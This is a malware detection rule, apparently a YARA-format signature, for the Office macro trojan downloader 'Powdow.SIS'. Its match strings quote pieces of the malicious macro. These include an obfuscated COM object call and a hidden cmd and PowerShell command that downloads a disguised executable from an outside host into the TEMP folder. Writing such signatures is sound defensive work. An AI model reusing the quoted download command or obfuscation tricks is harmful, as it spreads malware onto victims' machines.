
rule TrojanDownloader_O97M_Powdow_SIS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SIS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c 55 73 65 72 2e 65 78 60 65 22 } //01 00  = Environ("TEMP") & "\User.ex`e"
		$a_01_1 = {3d 20 52 65 70 6c 61 63 65 28 22 6e 65 77 3a 22 20 26 20 43 4c 6e 67 28 36 2e 37 29 20 26 20 22 32 43 73 6f 70 6c 61 6e 34 44 22 2c 20 22 73 6f 70 6c 61 6e 22 2c 20 22 32 22 29 } //01 00  = Replace("new:" & CLng(6.7) & "2Csoplan4D", "soplan", "2")
		$a_01_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 61 6b 69 6c 6f 64 69 73 7a 69 73 20 26 20 22 44 35 2d 44 22 20 26 20 43 4c 6e 67 28 36 2e 38 29 20 26 20 22 30 41 2d 34 33 38 42 2d 38 41 34 32 2d 39 38 34 22 20 26 20 43 4c 6e 67 28 31 2e 39 29 20 26 20 22 34 42 38 22 20 26 20 43 4c 6e 67 28 37 2e 38 29 20 26 20 22 41 46 42 22 20 26 20 43 49 6e 74 28 38 2e 32 29 29 } //01 00  = GetObject(akilodiszis & "D5-D" & CLng(6.8) & "0A-438B-8A42-984" & CLng(1.9) & "4B8" & CLng(7.8) & "AFB" & CInt(8.2))
		$a_01_3 = {6c 65 70 61 74 61 74 65 66 72 69 74 74 65 2e 65 78 65 63 20 22 63 6d 22 20 26 20 22 64 20 2f 63 20 70 6f 77 65 72 73 5e 68 65 6c 6c 20 2d 77 20 68 69 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 20 68 74 74 60 70 73 3a 2f 2f 73 68 33 32 33 38 34 32 33 2e 63 2e 68 61 64 2e 73 60 75 2f 64 61 6a 65 63 75 72 61 2e 6a 60 70 67 20 2d 44 65 73 74 20 22 20 26 } //00 00  lepatatefritte.exec "cm" & "d /c powers^hell -w hi Start-BitsTransfer -Sou htt`ps://sh3238423.c.had.s`u/dajecura.j`pg -Dest " &
	condition:
		any of ($a_*)
 
}